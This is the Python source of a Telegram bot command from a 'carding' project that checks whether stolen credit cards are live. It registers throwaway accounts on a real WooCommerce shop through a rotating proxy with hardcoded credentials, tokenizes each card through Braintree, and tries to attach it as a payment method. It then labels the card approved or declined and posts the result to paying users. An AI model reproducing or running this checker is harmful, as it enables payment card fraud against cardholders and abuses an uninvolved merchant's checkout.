import requests
import time
import random
import json
import string
import re
import urllib
import base64
from datetime import datetime
from random import choice

from pyrogram import Client
from pyrogram.types import Message

from carding.functions import *
from carding.database.checkuser_sql import already_added

def base64decode(message):
      message_bytes = message.encode('ascii')
      base64_bytes = base64.b64decode(message_bytes)
      base64_message = base64_bytes.decode('ascii')
      return base64_message
"""
?l = lowercase
?u = uppercase
?d = digit
?f = uppercase + lowercase
?m = uppercase + digit
?n = lowercase + digit
?i = uppercase + lowercase + digit
"""

def genRandomStr(toReplace):
    lc = string.ascii_lowercase
    uc = string.ascii_uppercase
    dg = string.digits
    lu = string.ascii_lowercase + string.ascii_uppercase
    ud = string.ascii_uppercase + string.digits
    ld = string.ascii_lowercase + string.digits
    uld = string.ascii_uppercase + string.ascii_lowercase + string.digits
    for x in toReplace:
        toReplace = toReplace.replace("?l", random.choice(lc), 1)
        toReplace = toReplace.replace("?u", random.choice(uc), 1)
        toReplace = toReplace.replace("?d", random.choice(dg), 1)
        toReplace = toReplace.replace("?f", random.choice(lu), 1)
        toReplace = toReplace.replace("?m", random.choice(ud), 1)
        toReplace = toReplace.replace("?n", random.choice(ld), 1)
        toReplace = toReplace.replace("?i", random.choice(uld), 1)
    return toReplace
mail = genRandomStr("xpro?i?i?i?i?i?i?i%40gmail.com")

@Client.on_message(cmd('ba'))
async def ba_func(client, message: Message):
    uid = message.from_user.id
    fname = message.from_user.mention()
    file = open('carding/temp/Premium.txt', 'r').readlines()
    if str(message.chat.id) + "\n" in file or str(uid) + "\n" in file or uid == 5032070399:
       pass
    else:
       await message.reply_text(text="**SORRY!**\nThis cmd only for paid users..")
       return
    if is_spam(uid):
        return await message.reply_text(text="**ANTISPAM!**\n`Wait in 5s and try again..`")

    try:
        if already_added(uid):
            pass
        elif not already_added(uid):
            await message.reply_text(text="Please **register** 1st..\nSend /register to registered")
            return
        query = ''
        for i in message.command[1:]:
            query += ' ' + str(i)
        if not query:
            await message.reply_text(text="**Input valid cc\nEx: `/ba cc|mm|yy|cvv`**")
            return
        
        start_time = time.time()
        xx = await message.reply_text(text="**Checking Your Card...⏳**")

        splitter = re.findall(r"[0-9]+", query)
        cc = splitter[0]
        mes = splitter[1]
        ano = splitter[2]
        cvc = splitter[3]
        cc1 = cc[:4]
        cc2 = cc[4:-8]
        cc3 = cc[8:-4]
        cc4 = cc[-4:]
        strlenx = len(cc)
        cvvd = cvc[:3]
        cvvx = cvc[:4]
        bin = cc[:6]
        file = open('carding/temp/bin.txt', 'r').readlines() 
        if str(bin) + "\n" in file:
           await xx.edit_text("**BIN BANNED!**"
                                )
           return
        if cc.startswith('5'):
           typex = 'master-card'
        if cc.startswith('4'):
           typex = 'visa'
        if cc.startswith('3'):
           typex = 'american-express'
        if cc.startswith('6'):
           typex = 'discover'
        if len(ano) == 2:
           ano = f'20{ano}'
        if (strlenx < 16):
           cvv = cvvx
        else:
           cvv = cvvd

        lista = cc + "|" + mes + "|" + ano + "|" + cvv

    
        ses = genRandomStr('?i?i?i?i?i?i?i?i-?i?i?i?i-?i?i?i?i-?i?i?i?i-?i?i?i?i?i?i?i?i?i?i?i?i')
        
        res = requests.get("https://dragon-bin-api.vercel.app/api/" + bin)
        bin_data = json.loads(res.text)
        vendor = bin_data["data"]["vendor"]
        bank = bin_data["data"]["bank"]
        type = bin_data["data"]["type"]
        country = bin_data["data"]["country"]
        level = bin_data["data"]["level"]
        flag = bin_data["data"]["countryInfo"]["emoji"]
        # -----------[ If Not Respond ]----------------
        vendor = "Unavailable" if not vendor else vendor
        bank = "Unavailable" if not bank else bank
        type = "Unavailable" if not type else type
        level = "Unavailable" if not level else level

        proxies = {
  "http": "http://fclndvmp-rotate:uch9vyu0utc9@p.webshare.io:80/",
  "https": "http://fclndvmp-rotate:uch9vyu0utc9@p.webshare.io:80/"
}
        
        ses = genRandomStr('?i?i?i?i?i?i?i?i-?i?i?i?i-?i?i?i?i-?i?i?i?i-?i?i?i?i?i?i?i?i?i?i?i?i')
#REQ 1
        url = 'https://www.highhandnursery.com/my-account/'
        headers = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36'
}
        resp = requests.get(url=url, headers=headers, proxies=proxies)
        register = getStr(resp.text, 'woocommerce-register-nonce" value="', '"')
        
#REQ2
        url = 'https://www.highhandnursery.com/my-account/'
        data = f'email={mail}&password=Leduchai123&woocommerce-register-nonce={register}&_wp_http_referer=%2Fmy-account%2F&register=Register'
        headers = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
    'content-type': 'application/x-www-form-urlencoded'
}
        resp = requests.post(url=url, data=data, headers=headers, proxies=proxies)
        
#REQ3
        url = 'https://www.highhandnursery.com/my-account/edit-address/billing/'
        headers = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36'
}
        resp = requests.get(url=url, headers=headers, proxies=proxies)
        edit = getStr(resp.text, 'woocommerce-edit-address-nonce" value="', '"')
        
#REQ4
        url = 'https://www.highhandnursery.com/my-account/edit-address/billing/'
        data = 'billing_first_name=at&billing_last_name=mos&billing_company=&billing_country=US&billing_address_1=192+street&billing_address_2=&billing_city=NY&billing_state=NY&billing_postcode=10980&billing_phone=05194692514&billing_email='+mail+'&save_address=Save+address&woocommerce-edit-address-nonce='+edit+'&_wp_http_referer=%2Fmy-account%2Fedit-address%2Fbilling%2F&action=edit_address'
        headers = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
    'content-type': 'application/x-www-form-urlencoded'
}
        resp = requests.post(url=url, data=data, headers=headers, proxies=proxies)
        
#REQ5
        url = 'https://www.highhandnursery.com/my-account/add-payment-method/'
        headers = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36'
}
        resp = requests.get(url=url, headers=headers, proxies=proxies)
        client = getStr(resp.text, 'client_token_nonce":"', '"')
        payment = getStr(resp.text, 'woocommerce-add-payment-method-nonce" value="', '"')
        
#REQ6
        url = 'https://www.highhandnursery.com/wp-admin/admin-ajax.php'
        data = f'action=wc_braintree_credit_card_get_client_token&nonce={client}'
        headers = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'
}
        resp = requests.post(url=url, data=data, headers=headers, proxies=proxies)
        b3 = getStr(resp.text, 'data":"', '"')
        b31 = base64decode(b3)
        b3bearer = getStr(b31, 'authorizationFingerprint":"', '"')
        
#REQ7
        url = 'https://payments.braintree-api.com/graphql'
        data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"'+ses+'"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'+cc+'","expirationMonth":"'+mes+'","expirationYear":"'+ano+'","cvv":"'+cvv+'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
        headers = {
    'Accept-Language': 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
'Authorization': 'Bearer '+b3bearer+'',
'Braintree-Version': '2018-05-10',
'Connection': 'keep-alive',
'Content-Type': 'application/json',
'Host': 'payments.braintree-api.com',
'Origin': 'https://assets.braintreegateway.com',
'Referer': 'https://assets.braintreegateway.com/',
'Sec-Fetch-Dest': 'empty',
'Sec-Fetch-Mode': 'cors',
'Sec-Fetch-Site': 'cross-site',
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Windows"'
}
        resp = requests.post(url=url, data=data, headers=headers, proxies=proxies)
        token = getStr(resp.text, 'token":"', '"')
        
        
#REQ7(FINAL REQ)
        url = 'https://www.highhandnursery.com/my-account/add-payment-method/'
        data = 'payment_method=braintree_credit_card&wc-braintree-credit-card-card-type='+type+'&wc-braintree-credit-card-3d-secure-enabled=&wc-braintree-credit-card-3d-secure-verified=&wc-braintree-credit-card-3d-secure-order-total=0.00&wc_braintree_credit_card_payment_nonce='+token+'&wc_braintree_device_data=&wc-braintree-credit-card-tokenize-payment-method=true&woocommerce-add-payment-method-nonce='+payment+'&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1'
        headers = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
    'content-type': 'application/x-www-form-urlencoded'
}
        resp = requests.post(url=url, data=data, headers=headers, proxies=proxies)
        result = getStr(resp.text, 'Status code ', '<')
        
        print(result)
        stop_time = time.time() - start_time
        date = datetime.today().strftime('%d-%m-%Y')
        if 'woocommerce-notices-wrapper"><ul class="woocommerce-error" role="alert">' in resp.text:
           status = "𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 ⭕"
           reson = "Auth Declined"
        elif 'Card Issuer Declined CVV' in resp.text:
           status = "𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 ✅"
           reson = "Card Issuer Declined CVV"
        elif 'Gateway Rejected: avs' in resp.text:
           status = "𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 ✅"
           reson = "AVS Mismatch"
        elif '2000: Do Not Honor' in resp.text:
           status = "𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 ⭕"
           reson = "2000: Do Not Honor"
        elif '2021: Security Violation' in resp.text:
           status = "𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 ⭕"
           reson = "2021: Security Violation"
        elif 'New payment method added' in resp.text or '81724: Duplicate card exists in the vault.' in resp.text or 'Insufficient Funds' in resp.text:
           status = "𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 ✅"
           reson = "1000:Approved ✓"
        else:
           status = "𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 ✅"
           reson = "Approved ✓"
           
        await xx.edit_text(f"""
𝐆𝐀𝐓𝐄 𝐁𝐑𝐀𝐈𝐍𝐓𝐑𝐄𝐄 𝐀𝐔𝐓𝐇
•━━━━━━━━━━━━━━━━━━━•
`{lista}`
╾──────────────────╼
•𝗦𝘁𝗮𝘁𝘀: {status}
•𝗠𝘀𝗴: {reson}
•𝗕𝗮𝗻𝗸 𝗡𝗮𝗺𝗲: {bank}
•𝗖𝗮𝗿𝗱 𝗕𝗿𝗮𝗻𝗱: {vendor}
•𝗖𝗮𝗿𝗱 𝗧𝘆𝗽𝗲: {type} • {level}
•𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}
•𝗧𝗼𝗼𝗸: `{stop_time:.02f}s` [ {date} ]
•━━━━━━━━━━━━━━━━━━━•
•𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: {fname} [ {ustat(uid)} ]
""")
        requests.session().close()
    except Exception as e:
        print(e)
